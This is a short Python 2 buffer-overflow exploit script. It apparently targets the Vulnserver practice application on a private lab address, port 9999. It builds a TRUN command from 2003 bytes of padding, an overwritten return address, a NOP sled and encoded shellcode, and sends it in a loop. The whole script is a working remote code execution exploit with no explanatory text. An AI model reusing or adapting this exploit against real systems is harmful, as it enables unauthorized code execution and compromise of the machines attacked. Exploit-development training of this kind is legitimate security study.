#!/usr/bin/python

import sys, socket

overflow = ("\xba\xf4\x9f\xc1\xbc\xd9\xe9\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x57\x12\x03\x57\x12\x83\x33\x9b\x23\x49\x47\x4c\x21"
"\xb2\xb7\x8d\x46\x3a\x52\xbc\x46\x58\x17\xef\x76\x2a\x75\x1c"
"\xfc\x7e\x6d\x97\x70\x57\x82\x10\x3e\x81\xad\xa1\x13\xf1\xac"
"\x21\x6e\x26\x0e\x1b\xa1\x3b\x4f\x5c\xdc\xb6\x1d\x35\xaa\x65"
"\xb1\x32\xe6\xb5\x3a\x08\xe6\xbd\xdf\xd9\x09\xef\x4e\x51\x50"
"\x2f\x71\xb6\xe8\x66\x69\xdb\xd5\x31\x02\x2f\xa1\xc3\xc2\x61"
"\x4a\x6f\x2b\x4e\xb9\x71\x6c\x69\x22\x04\x84\x89\xdf\x1f\x53"
"\xf3\x3b\x95\x47\x53\xcf\x0d\xa3\x65\x1c\xcb\x20\x69\xe9\x9f"
"\x6e\x6e\xec\x4c\x05\x8a\x65\x73\xc9\x1a\x3d\x50\xcd\x47\xe5"
"\xf9\x54\x22\x48\x05\x86\x8d\x35\xa3\xcd\x20\x21\xde\x8c\x2c"
"\x86\xd3\x2e\xad\x80\x64\x5d\x9f\x0f\xdf\xc9\x93\xd8\xf9\x0e"
"\xd3\xf2\xbe\x80\x2a\xfd\xbe\x89\xe8\xa9\xee\xa1\xd9\xd1\x64"
"\x31\xe5\x07\x2a\x61\x49\xf8\x8b\xd1\x29\xa8\x63\x3b\xa6\x97"
"\x94\x44\x6c\xb0\x3f\xbf\xe7\x7f\x17\x36\x77\x17\x6a\x48\x69"
"\xb4\xe3\xae\xe3\x54\xa2\x79\x9c\xcd\xef\xf1\x3d\x11\x3a\x7c"
"\x7d\x99\xc9\x81\x30\x6a\xa7\x91\xa5\x9a\xf2\xcb\x60\xa4\x28"
"\x63\xee\x37\xb7\x73\x79\x24\x60\x24\x2e\x9a\x79\xa0\xc2\x85"
"\xd3\xd6\x1e\x53\x1b\x52\xc5\xa0\xa2\x5b\x88\x9d\x80\x4b\x54"
"\x1d\x8d\x3f\x08\x48\x5b\xe9\xee\x22\x2d\x43\xb9\x99\xe7\x03"
"\x3c\xd2\x37\x55\x41\x3f\xce\xb9\xf0\x96\x97\xc6\x3d\x7f\x10"
"\xbf\x23\x1f\xdf\x6a\xe0\x3f\x02\xbe\x1d\xa8\x9b\x2b\x9c\xb5"
"\x1b\x86\xe3\xc3\x9f\x22\x9c\x37\xbf\x47\x99\x7c\x07\xb4\xd3"
"\xed\xe2\xba\x40\x0d\x27")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 16 +  overflow

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('192.168.137.133',9999))
		s.send(('TRUN /.:/' + shellcode))
		s.close()
	except:
		print "Error connecting to the server!"
		sys.exit()